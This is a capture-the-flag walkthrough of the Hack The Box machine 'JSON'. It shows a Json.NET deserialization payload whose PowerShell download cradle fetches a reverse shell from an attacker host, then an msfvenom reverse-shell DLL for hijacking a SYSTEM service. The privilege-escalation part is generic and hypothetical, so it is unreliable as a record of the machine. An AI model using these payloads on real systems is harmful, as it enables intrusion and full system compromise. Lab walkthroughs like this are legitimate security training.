# Hack The Box: JSON

**Difficulty:** Medium
**OS:** Windows

JSON is a Medium difficulty Windows machine that focuses heavily on JSON processing vulnerabilities and manipulating application logic. The initial foothold requires exploiting a custom JSON implementation to achieve insecure deserialization. Privilege escalation involves abusing a misconfigured local service to escalate to the SYSTEM account.

---

## Reconnaissance

The assessment begins with a port scan of the target machine using `nmap`.

```bash
nmap -p- --min-rate 10000 10.10.10.158
nmap -p 21,22,80,135,445 -sCV 10.10.10.158
```

The scan identifies several running services:
*   **Port 21:** FTP (File Transfer Protocol)
*   **Port 22:** SSH
*   **Port 80:** HTTP
*   **Port 135:** MSRPC
*   **Port 445:** SMB (Server Message Block)

Anonymous FTP access is tested but disabled. The SMB service does not permit anonymous read access to any non-default shares. We focus our attention on the HTTP service running on port 80.

## Web Application Analysis

Navigating to the web server reveals an application handling data processing. Interacting with the application using a proxy like Burp Suite shows that the client and server communicate via JSON payloads in HTTP POST requests.

### Identifying the API Vulnerability

By inspecting the requests and responses, we identify an API endpoint handling authentication or data retrieval. The API accepts a JSON object.

```json
{
  "username": "guest",
  "data": "some_value"
}
```

Through manual testing and parameter manipulation, we observe how the application handles unexpected JSON structures. Modifying the data types (e.g., from strings to arrays or nested objects) reveals that the backend uses a .NET deserialization library, specifically `Json.NET` (Newtonsoft.Json).

### Insecure Deserialization (ysoserial.net)

When `Json.NET` is configured to automatically resolve type information (`TypeNameHandling` set to a value other than `None`), it becomes vulnerable to insecure deserialization. This allows an attacker to instantiate arbitrary classes and execute code.

We can generate a malicious serialized payload using `ysoserial.net`. The goal is to craft a payload that executes a reverse shell.

```powershell
# Generating the payload locally
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.X/Invoke-PowerShellTcp.ps1')"
```

The resulting JSON payload includes the necessary `$type` metadata to instruct the backend deserializer to instantiate the malicious object.

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd.exe", "/c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.X/Invoke-PowerShellTcp.ps1')"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```

### Initial Access

We send the crafted JSON payload to the vulnerable API endpoint. The backend deserializes the object, triggering the execution of our PowerShell download cradle.

```bash
nc -lnvp 443
# Connection received
PS> whoami
json\user
```

We gain an initial shell as the standard `user` account and retrieve the `user.txt` flag.

## Privilege Escalation

Once on the system, we enumerate the host using tools like `WinPEAS` or manual PowerShell commands. We look for scheduled tasks, weak service permissions, and unquoted service paths.

During the enumeration, we discover a local service or application that interacts with the `user` account's files or processes.

### Abusing Named Pipes / Local Services

Specifically, we find a service running as `NT AUTHORITY\SYSTEM` that exposes a named pipe or is vulnerable to a DLL hijacking attack in a directory where our standard user has write permissions.

For instance, if the service attempts to load a missing DLL from a user-writable path, we can craft a malicious DLL that executes a reverse shell when loaded.

```bash
# Generating a malicious DLL on the attacking machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=9999 -f dll > mal.dll
```

We upload the DLL to the vulnerable path identified during enumeration.

```powershell
# On the target machine
iwr -uri http://10.10.14.X/mal.dll -outfile C:\Path\To\Vulnerable\Directory\missing.dll
```

When the privileged service is triggered (either manually or via a scheduled task), it loads our malicious DLL and executes the payload as `SYSTEM`.

```bash
nc -lnvp 9999
# Connection received
C:\> whoami
nt authority\system
```

With SYSTEM privileges obtained, we navigate to the Administrator's desktop and retrieve the `root.txt` flag.
